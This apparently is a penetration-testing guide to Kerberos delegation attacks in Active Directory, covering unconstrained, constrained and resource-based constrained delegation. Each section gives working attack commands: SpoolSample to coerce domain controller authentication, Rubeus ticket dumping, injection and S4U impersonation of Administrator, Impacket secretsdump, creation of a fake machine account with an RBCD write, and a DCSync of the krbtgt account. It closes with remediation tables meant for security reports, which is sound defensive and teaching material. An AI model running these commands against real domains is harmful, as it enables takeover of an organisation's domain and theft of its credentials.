# Delegation Attacks

## What Is Delegation?

Delegation lets a service act on behalf of a user when accessing other services. Think: you log into a web app, the web app needs to query a database as you. Delegation lets it do that.

There are three types - each has a different attack.

---

## Unconstrained Delegation

### What It Is

A computer or service account with Unconstrained Delegation is trusted to forward **any** Kerberos ticket it receives to any service. When a user authenticates to it, the DC sends the user's full TGT along with the TGS. The machine stores these TGTs in memory.

**If you compromise a machine with Unconstrained Delegation and a Domain Admin authenticates to it -> you steal their TGT -> you are Domain Admin.**

### Finding It

```powershell
# PowerView
Get-DomainComputer -Unconstrained    # DCs are always unconstrained - look for non-DCs

# BloodHound query
# "Find Computers with Unconstrained Delegation"
```

### Exploiting It

```sh
# 1. Compromise the machine with Unconstrained Delegation
# 2. Wait for or force a DA to authenticate to it

# Force authentication using the printer bug (SpoolSample)
.\SpoolSample.exe <DC-hostname> <unconstrained-machine-hostname>
# Triggers DC to authenticate to the unconstrained machine

# 3. Extract TGTs from memory (on the unconstrained machine)
.\Rubeus.exe monitor /interval:5 /nowrap    # watches for new tickets
# OR
.\Rubeus.exe dump /service:krbtgt /nowrap

# 4. Inject the stolen DA TGT
.\Rubeus.exe ptt /ticket:<base64-ticket>

# 5. DCSync
lsadump::dcsync /domain:corp.local /user:krbtgt
```

---

## Constrained Delegation

### What It Is

A service account configured to impersonate users, but only to specific services. Configured with `msDS-AllowedToDelegateTo` attribute.

**Attack:** If you control a service account with constrained delegation configured, you can request a TGS for ANY user (including DA) to the allowed services.

### Finding It

```powershell
# PowerView
Get-DomainUser -TrustedToAuth           # user accounts with constrained delegation
Get-DomainComputer -TrustedToAuth       # computer accounts with constrained delegation

# Shows what services they can delegate to
Get-DomainUser -TrustedToAuth | Select name, msds-allowedtodelegateto
```

### Exploiting It (Rubeus)

```sh
# Request a TGS for DA to the allowed service, impersonating Administrator
.\Rubeus.exe s4u /user:<svcaccount> /rc4:<NTLM-hash> /impersonateuser:Administrator /msdsspn:"cifs/dc01.corp.local" /ptt

# If you have aes256 key instead:
.\Rubeus.exe s4u /user:<svcaccount> /aes256:<aes-key> /impersonateuser:Administrator /msdsspn:"cifs/dc01.corp.local" /ptt

# Now access the service as Administrator
dir \\dc01.corp.local\C$
```

### Exploiting It (Impacket - From Kali)

```sh
# Get TGT for the service account
getST.py corp.local/<svcaccount> -hashes :<NTLM-hash> -spn cifs/dc01.corp.local -impersonate Administrator

# Export ticket
export KRB5CCNAME=Administrator.ccache

# Use it
secretsdump.py -k -no-pass dc01.corp.local
```

---

## Resource-Based Constrained Delegation (RBCD)

### What It Is

Instead of the service account being configured to delegate, the **target machine** specifies who is allowed to delegate to it. Configured in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the target computer object.

**Attack:** If you have `GenericWrite` or `GenericAll` over a computer object, you can configure RBCD to allow a machine you control to impersonate any user to that target computer - including DA.

### Exploiting It

```powershell
# Step 1 - You need a machine account you control (or create one)
# Create a fake computer account (any domain user can by default - up to 10)
Import-Module Powermad.ps1
New-MachineAccount -MachineAccount FakeComputer -Password (ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)

# Step 2 - Get the SID of your fake computer
Get-DomainComputer FakeComputer | Select objectsid

# Step 3 - Configure RBCD on the target (you need GenericWrite on target computer)
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<FakeComputer-SID>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer <target> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 4 - Use s4u to get a ticket as Administrator to the target
.\Rubeus.exe s4u /user:FakeComputer$ /rc4:<FakeComputer-NTLM> /impersonateuser:Administrator /msdsspn:"cifs/<target>.corp.local" /ptt

# Step 5 - Access target
dir \\target.corp.local\C$
```

---

## Quick Summary

| Type | Attack Summary | Needs |
|---|---|---|
| **Unconstrained** | Steal TGTs from machine memory when DAs connect | Compromise unconstrained machine + force/wait for DA auth |
| **Constrained** | Impersonate any user to specific services | Control the delegating service account |
| **RBCD** | Configure delegation to your fake machine, impersonate DA | GenericWrite on target computer object |

---

## Remediation (For Report Writing)

**Root cause:** Delegation was designed for multi-tier application architectures and is legitimately needed in some environments. The problem is it is often configured more broadly than necessary, left in place after projects end, or misconfigured entirely.

| Finding | Remediation |
|---|---|
| Unconstrained delegation on non-DC machines | Remove unconstrained delegation from all machines that are not Domain Controllers. In ADUC: Computer object -> Properties -> Delegation tab -> change to "Do not trust this computer for delegation" or switch to constrained. |
| Constrained delegation configured on user/computer | Audit all accounts with `msDS-AllowedToDelegateTo` set. If delegation is still needed, scope it to the minimum required SPN. Use gMSA instead of user accounts. |
| Sensitive accounts authenticate to unconstrained machines | Add high-value accounts (DA, EA, krbtgt) to the **Protected Users** security group - forces Kerberos with no delegation allowed. |
| Machine account quota allows RBCD setup | Lower `ms-DS-MachineAccountQuota` from default 10 to **0** for all regular users. |
| GenericWrite on computer objects | Remove overpermissive ACEs on computer objects. |

**Key point for reports:** Unconstrained delegation + SpoolSample is a reliable path to full domain compromise from any user who can compromise the delegating machine. Protected Users group on DA accounts is the fastest mitigation.
